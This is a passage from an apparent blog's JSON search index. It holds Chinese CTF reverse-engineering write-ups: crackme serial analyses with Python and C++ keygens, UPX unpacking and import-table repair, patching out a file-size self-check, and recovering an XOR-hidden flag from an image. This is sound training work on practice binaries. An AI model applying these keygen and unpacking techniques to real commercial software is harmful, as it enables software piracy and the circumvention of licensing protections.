ntdll.KiFastSystemCallRet 004024F1 . 56 push esi 004024F2 . 8B0E mov ecx,dword ptr ds:[esi] 004024F4 . FF91 A0000000 call dword ptr ds:[ecx+0xA0] 004024FA . 85C0 test eax,eax 004024FC . 7D 12 jge short Afkayas_.00402510 004024FE . 68 A0000000 push 0xA0 00402503 . 68 5C1B4000 push Afkayas_.00401B5C 00402508 . 56 push esi 00402509 . 50 push eax 0040250A . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; msvbvm50.__vbaHresultCheckObj 00402510 &gt; 8B45 E8 mov eax,dword ptr ss:[ebp-0x18] ** eax=input serial** 00402513 . 8B4D E4 mov ecx,dword ptr ss:[ebp-0x1C] 00402516 . 8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaSt&gt;; msvbvm50.__vbaStrCat 0040251C . 50 push eax ; push the serial we input 0040251D . 68 701B4000 push Afkayas_.00401B70 ; **AKA-** 00402522 . 51 push ecx ; **_str** 00402523 . FFD7 call edi ; **get the correct serial &quot;AKA-&quot;+_str** 00402525 . 8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaSt&gt;; msvbvm50.__vbaStrMove 0040252B . 8BD0 mov edx,eax 0040252D . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20] 00402530 . FFD3 call ebx ; &lt;&amp;MSVBVM50.__vbaStrMove&gt; 00402532 . 50 push eax ; push the correct serial 00402533 . FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCm&gt;; **compare** 00402539 . 8BF0 mov esi,eax ; ESI = 0 if equal，1 if not 0040253B . 8D55 E0 lea edx,dword ptr ss:[ebp-0x20] 0040253E . F7DE neg esi ; ESI = -ESI 00402540 . 8D45 E8 lea eax,dword ptr ss:[ebp-0x18] 00402543 . 52 push edx ; ntdll.KiFastSystemCallRet 00402544 . 1BF6 sbb esi,esi ; ESI = ESI-ESI-CF 00402546 . 8D4D E4 lea ecx,dword ptr ss:[ebp-0x1C] 00402549 . 50 push eax 0040254A . 46 inc esi ; ESI++ 0040254B . 51 push ecx 0040254C . 6A 03 push 0x3 0040254E . F7DE neg esi ; ESI = -ESI =&gt; -1 if equal，0 if not 00402550 . FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;; msvbvm50.__vbaFreeStrList 00402556 . 83C4 10 add esp,0x10 00402559 . 8D55 D8 lea edx,dword ptr ss:[ebp-0x28] 0040255C . 8D45 DC lea eax,dword ptr ss:[ebp-0x24] 0040255F . 52 push edx ; ntdll.KiFastSystemCallRet 00402560 . 50 push eax 00402561 . 6A 02 push 0x2 00402563 . FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeO&gt;; msvbvm50.__vbaFreeObjList 00402569 . 83C4 0C add esp,0xC 0040256C . B9 04000280 mov ecx,0x80020004 00402571 . B8 0A000000 mov eax,0xA 00402576 . 894D 9C mov dword ptr ss:[ebp-0x64],ecx 00402579 . 66:85F6 test si,si 0040257C . 8945 94 mov dword ptr ss:[ebp-0x6C],eax 0040257F . 894D AC mov dword ptr ss:[ebp-0x54],ecx 00402582 . 8945 A4 mov dword ptr ss:[ebp-0x5C],eax 00402585 . 894D BC mov dword ptr ss:[ebp-0x44],ecx 00402588 . 8945 B4 mov dword ptr ss:[ebp-0x4C],eax 0040258B . 74 58 je short Afkayas_.004025E5 分析可得： Name/Serial关系为： _res = strlen(Name)* 0x17CFB +Name[0] Serial = “AKA-_res” python脚本如下： name = raw_input(&apos;please input name:&apos;) serial = len(name)*int(&apos;17cfb&apos;,16) + ord(name[0]) print &apos;AKA-%d&apos;%serial 测试几组数据，正确.","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"点滴算法","slug":"点滴算法","date":"2017-08-18T08:03:20.000Z","updated":"2018-07-30T13:12:32.974Z","comments":true,"path":"2017/08/18/点滴算法/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/18/点滴算法/","excerpt":"我是有一点算法情怀的。而我也一直认为学好算法是从事计算机相关行业人员所必备的。里面是我收集的对学习算法有帮助的一些知识。","text":"我是有一点算法情怀的。而我也一直认为学好算法是从事计算机相关行业人员所必备的。里面是我收集的对学习算法有帮助的一些知识。 字符转数字、数字转字符: http://blog.sina.com.cn/s/blog_4c8a2a870100qgq7.html 计算任意一天是星期几的一种常用方法 W = ([Y-1] + [(Y-1)/4] - [(Y-1)/100] + [(Y-1)/400] + D) mod 7 Y是年份数，D是这一天在这一年中的累积天数，也就是这一天在这一年中是第几天。 为了求出Y年M月D日是星期几,只需求从公元1年1月1日至公元Y年M月D日包含的总天数除以7的余数,自然关键是求这个总天数如下分析:(1)假设只有在平年的情况下,Y年之前Y-1中包含的天数为365（Y-1）(2)考虑闰年的情况,每4年一闰,但逢100年除外,然而每400年又要加一个闰日.于是Y-1年共有闰日[(Y-1)/4] - [(Y-1)/100] + [(Y-1)/400] ,再加上M月D日包含的天数,即可得总天数(3)因为365≡1（mod 7）,所以365（Y-1）≡（Y-1)（mod 7）,这样,在求总天数除以7的余数时,可把365*（Y-1）简化为（Y-1）即W =( [Y-1] + [(Y-1)/4] - [(Y-1)/100] + [(Y-1)/400] + D ) mod 7","categories":[],"tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://leo.dropsec.xyz/tags/数据结构与算法/"}]},{"title":"CrackMe 001","slug":"CrackMe-001","date":"2017-08-17T14:02:50.000Z","updated":"2018-07-30T13:10:23.293Z","comments":true,"path":"2017/08/17/CrackMe-001/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/17/CrackMe-001/","excerpt":"适合新手破解的160个crackme练手…好难呀，理解不了我能有什么办法~~ 我也是很无奈哦… 想了想还是需要硬着头皮做下去，谁让我是学计算机的呢？立个flag，之后每天攻克一道crackme…","text":"适合新手破解的160个crackme练手…好难呀，理解不了我能有什么办法~~ 我也是很无奈哦… 想了想还是需要硬着头皮做下去，谁让我是学计算机的呢？立个flag，之后每天攻克一道crackme… crackme系列题目下载链接 先来观察一下程序点击主界面Serial/Name按钮，进入Name Serial子界面：点击主界面Serial按钮，进入Serial子界面： 明确目标：1.破解Serial子界面的序列号2.破解Name Serial子界面的用户名/序列号 查壳：用PEiD查壳结果为Borland Delphi 3.0，无壳。 破解使用OllyDbg工具打开Acid burn.exe，先破解破解SerialSerial子界面的错误提示框为：智能查找字符串Failed,找到对应汇编代码往上寻找判断代码，很容易发现关键跳所以jnz上面那个Call是比较输入Serial与正确Serial的，下个断点，重载程序，运行，选择Serial模块，输入test程序断在call处，观察此时eax edx的值，结合汇编代码可以得出正确的Serial为:”Hello Dude!” 然后破解Name Serial子界面的用户名/序列号Name Serial子界面的错误提示框为：查找字符串Sorry,找到对应汇编代码 0042FA57 |. 83F8 04 cmp eax,0x4 //长度 &gt;=4 0042FA5A |. 7D 1D jge short 01.0042FA79 0042FA5C |. 6A 00 push 0x0 0042FA5E |. B9 74FB4200 mov ecx,01.0042FB74 ; Try Again! 0042FA63 |. BA 80FB4200 mov edx,01.0042FB80 ; Sorry , The serial is incorect ! 0042FA68 |. A1 480A4300 mov eax,dword ptr ds:[0x430A48] 0042FA6D |. 8B00 mov eax,dword ptr ds:[eax] 0042FA6F |. E8 FCA6FFFF call 01.0042A170 0042FA74 |. E9 BE000000 jmp 01.0042FB37 0042FA79 |&gt; 8D55 F0 lea edx,[local.4] 0042FA7C |. 8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC] 0042FA82 |. E8 D1AFFEFF call 01.0041AA58 0042FA87 |. 8B45 F0 mov eax,[local.4] ; kernel32.763D8744 0042FA8A |. 0FB600 movzx eax,byte ptr ds:[eax] 0042FA8D |. F72D 50174300 imul dword ptr ds:[0x431750] 0042FA93 |. A3 50174300 mov dword ptr ds:[0x431750],eax 0042FA98 |. A1 50174300 mov eax,dword ptr ds:[0x431750] 0042FA9D |. 0105 50174300 add dword ptr ds:[0x431750],eax 0042FAA3 |. 8D45 FC lea eax,[local.1] 0042FAA6 |. BA ACFB4200 mov edx,01.0042FBAC ; CW 0042FAAB |. E8 583CFDFF call 01.00403708 0042FAB0 |. 8D45 F8 lea eax,[local.2] 0042FAB3 |. BA B8FB4200 mov edx,01.0042FBB8 ; CRACKED 0042FAB8 |. E8 4B3CFDFF call 01.00403708 0042FABD |. FF75 FC push [local.1] 0042FAC0 |. 68 C8FB4200 push 01.0042FBC8 ; - 0042FAC5 |. 8D55 E8 lea edx,[local.6] 0042FAC8 |. A1 50174300 mov eax,dword ptr ds:[0x431750] 0042FACD |. E8 466CFDFF call 01.00406718 0042FAD2 |. FF75 E8 push [local.6] 0042FAD5 |. 68 C8FB4200 push 01.0042FBC8 ; - 0042FADA |. FF75 F8 push [local.2] ; kernel32.BaseThreadInitThunk 0042FADD |. 8D45 F4 lea eax,[local.3] 0042FAE0 |. BA 05000000 mov edx,0x5 0042FAE5 |. E8 C23EFDFF call 01.004039AC 0042FAEA |. 8D55 F0 lea edx,[local.4] 0042FAED |. 8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0] 0042FAF3 |. E8 60AFFEFF call 01.0041AA58 0042FAF8 |. 8B55 F0 mov edx,[local.4] ; kernel32.763D8744 0042FAFB |. 8B45 F4 mov eax,[local.3] 0042FAFE |. E8 F93EFDFF call 01.004039FC 0042FB03 |. 75 1A jnz short 01.0042FB1F 0042FB05 |. 6A 00 push 0x0 0042FB07 |. B9 CCFB4200 mov ecx,01.0042FBCC ; Congratz !! 0042FB0C |. BA D8FB4200 mov edx,01.0042FBD8 ; Good job dude =) 0042FB11 |. A1 480A4300 mov eax,dword ptr ds:[0x430A48] 0042FB16 |. 8B00 mov eax,dword ptr ds:[eax] 0042FB18 |. E8 53A6FFFF call 01.0042A170 0042FB1D |. EB 18 jmp short 01.0042FB37 0042FB1F |&gt; 6A 00 push 0x0 0042FB21 |. B9 74FB4200 mov ecx,01.0042FB74 ; Try Again! 0042FB26 |. BA 80FB4200 mov edx,01.0042FB80 ; Sorry , The serial is incorect ! 0042FB2B |. A1 480A4300 mov eax,dword ptr ds:[0x430A48] 0042FB30 |. 8B00 mov eax,dword ptr ds:[eax] 0042FB32 |. E8 39A6FFFF call 01.0042A170 0042FB37 |&gt; 33C0 xor eax,eax 分析可得0x0042FA57处的指令”CMP EAX,4”限制了输入的Name的长度必须大于等于40x0042FA79 - 0x0042FAFE的代码验证了输入的Name/Serial是否正确，根据验证结果进行跳转将0x0042FA87 - 0x0042FAFE的代码单独拎出来，分析如下： 0042FA87 |. 8B45 F0 mov eax,[local.4] ; save name sddress 0042FA8A |. 0FB600 movzx eax,byte ptr ds:[eax] ; save first char of name to eax 0042FA8D |. F72D 50174300 imul dword ptr ds:[0x431750] ; eax *= 41 0042FA93 |. A3 50174300 mov dword ptr ds:[0x431750],eax ; [0x431750] = EAX 0042FA98 |. A1 50174300 mov eax,dword ptr ds:[0x431750] ; EAX = [0x431750] 0042FA9D |. 0105 50174300 add dword ptr ds:[0x431750],eax ; eax*=2 标记为 _res 0042FAA3 |. 8D45 FC lea eax,[local.1] 0042FAA6 |. BA ACFB4200 mov edx,01.0042FBAC ; CW 0042FAAB |. E8 583CFDFF call 01.00403708 0042FAB0 |. 8D45 F8 lea eax,[local.2] 0042FAB3 |. BA B8FB4200 mov edx,01.0042FBB8 ; CRACKED 0042FAB8 |. E8 4B3CFDFF call 01.00403708 0042FABD |. FF75 FC push [local.1] ; push CW 0042FAC0 |. 68 C8FB4200 push 01.0042FBC8 ; - 0042FAC5 |. 8D55 E8 lea edx,[local.6] 0042FAC8 |. A1 50174300 mov eax,dword ptr ds:[0x431750] ; eax= _res 0042FACD |. E8 466CFDFF call 01.00406718 ; itos(), remember the result as _str 0042FAD2 FF75 E8 push dword ptr ss:[ebp-0x18] ; push _str 0042FAD5 68 C8FB4200 push 01.0042FBC8 ; - 0042FADA |. FF75 F8 push [local.2] ; push &quot;CRACKED&quot; 0042FADD |. 8D45 F4 lea eax,[local.3] 0042FAE0 |. BA 05000000 mov edx,0x5 0042FAE5 |. E8 C23EFDFF call 01.004039AC ; get the correct serial &quot;CW-&quot;+_str+&quot;-CRACKED&quot; 0042FAEA |. 8D55 F0 lea edx,[local.4] 0042FAED |. 8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0] 0042FAF3 |. E8 60AFFEFF call 01.0041AA58 0042FAF8 |. 8B55 F0 mov edx,[local.4] ; get the real serial we input 0042FAFB |. 8B45 F4 mov eax,[local.3] ; the real serial 0042FAFE |. E8 F93EFDFF call 01.004039FC ; compare 可知正确的Name/Serial关系为 _res = Name[0] 0x29 2，Serial = “CW-_res-CRACKED”能够写注册机了： #include &lt;iostream&gt; #include &lt;cstdio&gt; #include &lt;cstring&gt; #define N 10000 using namespace std; int main() { char buffer[N]; short int c; cout&lt;&lt;&quot;please input name:\\n&quot;; gets(buffer); if(strlen(buffer)&lt;4) //判断序列号长度 { cout&lt;&lt;&quot;Error!&quot;&lt;&lt;endl; } else { c=buffer[0]; c=c*0x29; c=c*2; cout&lt;&lt;&quot;serial:&quot;&lt;&lt;endl; printf(&quot;Serial: CW-%4d-CRACKED\\r\\n&quot;,c); } return 0; } PS:分析算法真是让人头疼…","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"合天 CTF-REVERSE练习之.NET WP","slug":"合天-CTF-REVERSE练习之-NET-WP","date":"2017-08-13T11:37:47.000Z","updated":"2018-07-30T13:08:06.403Z","comments":true,"path":"2017/08/13/合天-CTF-REVERSE练习之-NET-WP/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/13/合天-CTF-REVERSE练习之-NET-WP/","excerpt":"想学好逆向、想打好CTF，想学好网安，需要掌握的知识很多吖，就一个简单的逆向想做好就关系到.NET、C#，还要熟悉其语法写出脚本，而我现在什么都还不会…唉，骚年，在最平静的大学生活中努力吧。","text":"想学好逆向、想打好CTF，想学好网安，需要掌握的知识很多吖，就一个简单的逆向想做好就关系到.NET、C#，还要熟悉其语法写出脚本，而我现在什么都还不会…唉，骚年，在最平静的大学生活中努力吧。REVERSE是CTF竞赛中的一种常见题型，除了对常见的二进制程序进行逆向分析之外，对.NET程序的分析也是一个考查点。本实验通过实例讲解如何对简单的.NET程序进行逆向分析，并介绍.NET逆向分析工具ILSpy的使用。 这个实验的核心在于熟练.NET及其反编译软件，也涉及到加密与解密的算法，而我还很菜很菜，目前这个水平还不能完全驾驭它，故请大家来看标准的实验指导书","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"合天 CTF-REVERSE练习之病毒分析 WP","slug":"合天-CTF-REVERSE练习之病毒分析-WP","date":"2017-08-13T10:28:17.000Z","updated":"2018-07-30T13:07:15.600Z","comments":true,"path":"2017/08/13/合天-CTF-REVERSE练习之病毒分析-WP/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/13/合天-CTF-REVERSE练习之病毒分析-WP/","excerpt":"病毒分析，停起来很厉害的一个名字，首次接触，在做完这个实验之后，感觉也没什么好写的，可能是自己水平还是太低，没能体会到其精髓吧…故暂且将实验指导书拿来。","text":"病毒分析，停起来很厉害的一个名字，首次接触，在做完这个实验之后，感觉也没什么好写的，可能是自己水平还是太低，没能体会到其精髓吧…故暂且将实验指导书拿来。其中推荐的三个沙箱都用不了哦。………………………………………..在查询“后门文件”是什么的时候，偶然发现这个:https://zhidao.baidu.com/question/1669211327117057667.html可以尝试一下哦… 小小分享：MD5在线加密 https://md5jiami.51240.com/有道在线翻译 http://fanyi.youdao.com/各种查询工具 https://www.51240.com/ （ ￣︶￣ ）↗","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"合天 CTF-REVERSE练习之信息提取 WP","slug":"合天-CTF-REVERSE练习之信息提取-WP","date":"2017-08-13T08:02:40.000Z","updated":"2018-07-30T13:06:54.304Z","comments":true,"path":"2017/08/13/合天-CTF-REVERSE练习之信息提取-WP/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/13/合天-CTF-REVERSE练习之信息提取-WP/","excerpt":"有两个比较喜欢的女歌手我一直搞混，曲婉婷、范玮琪。总是想起来这个而记不起那个，记得之前高三的时候跟二百说这个，他说这两个人风格完全不一样，怎么会混淆…( ╯□╰ )OK,开始切入正题…","text":"有两个比较喜欢的女歌手我一直搞混，曲婉婷、范玮琪。总是想起来这个而记不起那个，记得之前高三的时候跟二百说这个，他说这两个人风格完全不一样，怎么会混淆…( ╯□╰ )OK,开始切入正题…本实验主要介绍了CTF-REVERSE信息提取，通过本实验的学习，你能够掌握十六进制编辑器C32Asm的基本用法，了解图片Exif信息，以及快速提取二维码中信息的方法，了解PNG图片格式的基本特征。我也是首次接触这个吖 预备知识一：C32Asm一款非常不错的国产静态反编译工具，C32Asm现具有如下功能：快速静态反编译PE格式文件(Exe、Dll等)，提供Hex文件编辑功能，功能强大，提供内存Dump、内存编辑、PE文件Dump、PE内存ImageSize修正等多种实用功能。通常主要讲C32Asm当做16进制编辑器来使用，因为成熟的静态反编译工具如IDA等已经非常强大了，本实验中也只使用C32Asm的十六进制编辑器功能。C32Asm可以十分方便的进行十六进制编辑操作，同时支持对指定的数据块进行各种运算操作，包括异或运算等。 二：二维码二维码（Quick Response Code），又称二维条码。它是用特定的几何图形按一定规律在平面（二维方向）上分布的黑白相间的图形，是所有信息数据的一把钥匙。在现代商业活动中，二维码的应用十分广泛，如：产品防伪/溯源、广告推送、网站链接、数据下载、商品交易、定位/导航、电子商务应用、车辆管理、信息传递等。如今的二维码应用十分的广泛，许多手机APP都可以进行二维码信息的识别以及二维码图片生成等，互联网上也有许多支持二维码生成以及二维码信息提取的网站，如http://cli.im 等。 三：Exif信息Exif是一种图象文件格式，它的数据存储与JPEG格式是完全相同的。实际上Exif格式就是在JPEG格式头部插入了数码照片的信息，包括拍摄时的光圈、快门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、色彩编码、拍摄时录制的声音以及全球定位系统（GPS）、缩略图等。简单地说，Exif=JPEG+拍摄参数。因此，你可以利用任何可以查看JPEG文件的看图软件浏览Exif格式的照片，但并不是所有的图形程序都能处理Exif信息。 操作打开给的文件，发现是一张图片,提示语：奇怪的狗尾巴！汪汪汪通常拿到图片之后，首先查看图片的属性信息中是否存在Exif提示信息，我们通过查看文件属性，发现程序没有Exif信息，如图所示：然后用C32Asm打开文件，发现文件开头字节是BM说明它确实是BMP位图。根据“奇怪的狗尾巴！汪汪汪”给我们的提示，可能是在文件末尾有信息。拉到最下面，在C32Asm中拖动到文件末尾，发现了一个IEND字符串，如图所示注意在PNG图片格式中，PNG数据由一个一个数据块（Data Chunk）组成。每个数据块都有一个4字节长度的标识，典型的有IHDR、IDAT、IEND等。完整的PNG数据总是以一个IHDR块开头，最终以一 个IEND块结束的，而真正表示图像数据的IDAT块则嵌在IHDR块和IEND块之间。这里可以猜测在BMP图片的末尾附加了一个PNG图片，那么继续往上查找，我们看到了IHDR标志，找到IHDR前面的PNG标志，复制出PNG数据。详细步骤如下1）在C32Asm中使用鼠标选择从0xB6C16开始的数据，直到文件末尾2）右键，拷贝-&gt;拷贝3）在文件中新建十六进制文件，在新键文件中选中自带的00右键粘贴4）文件中保存文件为test.png图片打开这张图片发现是一张二维码，保存，打开http://cli.im/deqr ，选择“上传二维码图片”，将刚刚保存的二维码图片进行上传识别，得到一个URLhttp://blog.sina.com.cn/s/blog_703d65470102v6tf.html 访问这个URL，看到一篇文章“一张美美的图片”，提示信息为“二维码图片末尾还有数据哦，尝试进行异或运算，key为0x88”。再次使用C32Asm打开test.png二维码图片，按下Ctrl+A选择所有数据，单击鼠标右键，在弹出的菜单中选择“修改数据”， 在弹出的“修改数据”对话框中，选择“异或”运算，后边填入88，单击确定按钮，就可以看到flag信息了，如图所示：我们看到图片的末尾为“flag{CtF_Re_iS_FuN}”，这就是我们要找的flag了。 小小提示：电脑扫二维码网址：http://cli.im/deqr二维码制作网址：http://cli.im","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"合天 CTF-REVERSE练习之脱壳分析 WP","slug":"合天-CTF-REVERSE练习之脱壳分析-WP","date":"2017-08-13T03:28:40.000Z","updated":"2018-07-30T13:06:37.066Z","comments":true,"path":"2017/08/13/合天-CTF-REVERSE练习之脱壳分析-WP/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/13/合天-CTF-REVERSE练习之脱壳分析-WP/","excerpt":"这个脱壳分析实验和之前写的“壳与ESP定律“内容有些是重复的，因为这个实验就使用了ESP定律来脱壳的，但是这个实验在某些方面比较详细，是一个不错的补充，特别是脱壳后对软件的修复…","text":"这个脱壳分析实验和之前写的“壳与ESP定律“内容有些是重复的，因为这个实验就使用了ESP定律来脱壳的，但是这个实验在某些方面比较详细，是一个不错的补充，特别是脱壳后对软件的修复… 运行这个软件是这样的用PEID查壳，发现是UPX壳这个时候如果拖进IDA去分析的话会弹出一些提示意味着程序经过加壳处理，最好不要用IDA去进行分析，因为加壳后的程序很难通过IDA的静态分析来理解程序的内部执行逻辑。所以我们用OD打开，接下来就是运用ESP定律来脱壳了F8单步，发现只有ESP、EIP寄存器变红的时候就可以用ESP了然后选择ESP的内容，右键-&gt;数据窗口中跟随，然后在数据窗口中选中对应数据 ，右键，断点-&gt;硬件访问-&gt;对应字节。然后就设置好硬件断点了。F9运行到断点然后就可以删除断点了 ，调试-&gt;硬件断点-&gt;删除。F7单步，会有一个循环很烦人，所以选中循环下的语句，F4直接运行到这里F8单步到004094F8，这就是OEP，右键选择用OD脱壳注意94F8才是程序入口。然后脱壳输入文件名保存。现在请不要关闭OD，后面还需要进行修复操作。对UPX脱壳而言，进行到这一步就可以了，但是如果是另外一些壳，可能还需要对程序的输入表进行修复操作。 修复脱壳后的程序注意在继续进行实验之前，请确保你停留在实验步骤二中最后的一步。现在打开桌面上的ImportREC程序，首先在进程列表中选择C:\\Reverse\\6\\crackme6.exe，然后在OEP中填入94F8（也就是在OD中找到的一个信息），然后点击“IAT AutoSearch”按钮，接着点击“GetImports”按钮，就可以看到程序的输入表信息了。点击右侧的“Show Invalid”按钮，看看是否存在无效的输入表项目。无效的输入表项目前面带有问号（？），如果有可以使用右键菜单删除。这里没有无效的输入表项目，所以选择“Fix Dump”按钮，对我们的dumped.exe进行修复，得到dumped.exe程序。现在对程序的脱壳以及修复操作已经全部完成，使用PEiD对dumped.exe程序查壳，可以看到提示“Microsoft Visual C++ 6.0”信息，dumped_.exe程序也可以正常运行，至此脱壳完成。…………………………………………………………………………………………………………………………..以上是合天的一个实验指导，当我在实验吧看到一个类似的实验时，发现实验吧对这个类似题目处理的步骤增多了，下面简单补充： 在用OD的脱壳工具查看OEP之后，发送到LordPE软件，选择带脱壳的软件，右键选择“修正镜像大小”，单机确定按钮；然后再次选择带脱壳软件，右键选择“完整保存”，保存即可。 然后将它发送到ImportREC软件，下拉对话框中选择程序，输入OEP，单击IAT自动查找，然后单击获取导入表，然后单击显示无效函数，有的话右键删除，没有就单击修正转存，保存即可。（完成脱壳）…………………………………………………………………………………………………………………………..以上两步应该算是软件的修复吧，有些软件还需要去除软件大小自校验将脱壳后的软件发送到OD，菜单栏选择插件-&gt;APId断点设置工具-&gt;常用断点设置，弹出窗口选择文件处理-&gt;GetFileSize,F9运行，断点处暂停单击堆栈窗口，右键选择在反汇编窗口中跟随单击反汇编窗口调用函数的代码行，F2，然后切换到断点窗口（B），删除GetFileSize断点 ，程序中的GetFileSize函数获取了脱壳后程序的大小，然后利用命令cmp eax,0xc6c8命令比较，不相等则跳转 ，脱壳后程序要比源程序大，所以跳转退出程序。。把两个Ja的命令NOP掉，去除软件大小限制，然后选择所以修改保存即可。然后运行程序发现可以正常运行了…(有些软件以上三步缺一步就不可以正常 运行…)","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"合天 CTF-REVERSE练习之算法分析2 WP","slug":"合天-CTF-REVERSE练习之算法分析2-WP","date":"2017-08-12T13:27:21.000Z","updated":"2018-07-30T13:04:41.337Z","comments":true,"path":"2017/08/12/合天-CTF-REVERSE练习之算法分析2-WP/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/12/合天-CTF-REVERSE练习之算法分析2-WP/","excerpt":"本实验以自定义算法为例，讲解如何编写一个注册机。 积累经验喽…","text":"本实验以自定义算法为例，讲解如何编写一个注册机。 积累经验喽…本题的核心在于分析自定义算法，进而写出注册机，所以这里直接看关键代码。长方形括住的的是核心代码，简化为 szUsername[v1] ^ byte_423678[v1] == szPassword[v1]根据异或运算的性质，上述条件可以转换为 szPassword [v1] ^ byte_423678[v1] == szUsername [v1]我们需要把byte_423678的内容提取出来，为： 1, 2, 3, 4, 1, 5, 1, 5, 1, 3, 6, 5, 4, 8, 5, 3, 1, 2, 3, 4, 5, 3, 5, 7, 2, 3, 2, 4, 8, 2, 5, 6, 4 这就是我们找到的XOR密钥数组。程序的注册算法为：将用户名的每一个字符与XOR密钥数组中的对应下标的字符进行异或运算，产生注册码字符串对应的字符。 我们编写这样一段Python脚本即可： def crack(username): key = [1, 2, 3, 4, 1, 5, 1, 5, 1, 3, 6, 5, 4, 8, 5, 3, 1, 2, 3, 4, 5, 3, 5, 7, 2, 3, 2, 4, 8, 2, 5, 6, 4] pwd = [] for i in xrange(0, len(username)): pwd.append(chr(ord(username[i]) ^ key[i])) return &quot;&quot;.join(pwd) if __name__ == &quot;__main__&quot;: while True: username = raw_input(&quot;input username:&quot;) serial = crack(username) print &quot;serial: %s&quot; % serial 我们输入用户名Wins0n，就可以得到注册码为Vkmw1k，输入程序可以成功注册","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"合天 CTF-REVERSE练习之算法分析1 WP","slug":"合天-CTF-REVERSE练习之算法分析1-WP","date":"2017-08-12T09:48:25.000Z","updated":"2018-07-30T13:04:24.803Z","comments":true,"path":"2017/08/12/合天-CTF-REVERSE练习之算法分析1-WP/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/12/合天-CTF-REVERSE练习之算法分析1-WP/","excerpt":"有点伤心、有的无奈，实验指导书中并不是全部步骤都十分理解，但是我还是需要尝试着写一下，万一再琢磨一下就懂了呢？","text":"有点伤心、有的无奈，实验指导书中并不是全部步骤都十分理解，但是我还是需要尝试着写一下，万一再琢磨一下就懂了呢？算法分析是CTF REVERSE题型中的一个常见考察点，相对于字符串明文跟踪而言，算法分析具有更大的挑战性，参赛选手需要仔细理解程序内部关键算法的过程，才能编写出注册机（Keygen）。本实验以MD5算法为例，讲解如何识别程序内部使用的算法类型，并讲解IDA的一些基本功能来加速我们的理解过程。 实验准备一、PEiD密码算法分析插件PEiD有一个叫做Krypto ANALyzer的插件，使用这个插件可以对程序进行扫描，通过特征匹配来识别程序内部可能用到的一些标准算法。Krypto ANALyzer的使用方法为：点击PEiD主界面右下角的“=&gt;”按钮，选择“插件”菜单项，然后选择“Krypto ANALyzer”，就可以弹出Krypto ANALyzer插件了。Krypto ANALyzer插件会自动分析程序内部可能用到的标准算法下图中显示了程序中在地址00401E5C处存在MD5算法的特征： 二、IDA重命名等功能在IDA中，我们可以通过按下N键来对一个变量/函数/标记等进行重命名操作，函数和变量命名对于帮主我们理解程序的内部逻辑非常重要，就好比我们在编程的时候，培养良好的编程风格非常重要一样。比如如果函数sub_4012E0经过我们分析之后，确定其功能为将传入的字符串转为大写形式，那么我们可以选中sub_4012E0后按下N键对其进行重命名（将函数名命名为fnStringToUpper）：IDA通过还可以给汇编指令或者伪代码来添加注释。如果要对某一条汇编指令添加注释，只需要在汇编指令所在行按下封号（即;）即可弹出对话框来接收注释；如果要给伪代码添加注释，则只需在伪代码所在行按下斜杠（即/）即可弹出对话框来接收注释。OD也可以给汇编指令添加注释，只需要在汇编指令所在行后一列的空白处双击鼠标左键即可，如图所示： 实际操作通过API交叉引用快速定位关键代码观察程序，运行这个程序后要求输入一个用户名和密码进行注册，当注册失败的时候，程序将弹出一个消息框提示不正确，如图所示：那么我们可以通过IDA的交叉引用功能来定位这一块的代码。使用IDA载入CrackMe4.exe程序，待分析结束后，通过Imports TAB页面找到MessageBoxA，双击来到反汇编视图，在MessageBoxA按下X按键对其进行交叉引用查找，经过一个一个进行分析，我们发现sub_4016B0就是我们所要找的关键函数，我们通过F5得到这个函数的伪代码。通过对伪代码添加注释，以及对变量进行重命名操作，我们得到如下的代码片段：上面的伪代码有两个错误，就是在第一个if语句中会判断密码的长度是否为33，如果不是33就弹出错误提示。其实这里是32（而用户名的长度则不能大于10）只是Hex-Rays Decompiler这个插件生成伪代码时出错了，所以需要记住，F5生成的伪代码并不保证完全正确。32这个长度对应汇编指令中的代码片段如下：通过上面的伪代码的分析，我们发现只有sub_401510这个函数的功能并不清楚，通过双击sub_401510查看对应的伪代码，发现有点复杂，暂时无法理解，不过这并不要紧。 使用PEiD的Krypto ANALyzer识别算法如果程序使用了标准算法进行处理，那么可以使用PEiD的Krypto ANALyzer进行快速识别，将CrackMe4.exe载入PEiD，点击PEiD主界面右下角的“=&gt;”按钮，选择“插件”菜单项，然后选择“Krypto ANALyzer”，就可以弹出Krypto ANALyzer插件了，Krypto ANALyzer提示程序使用了MD5算法，如下图所示：我们记住00401E5C这个地址，在IDA的反汇编指令视图（IDA 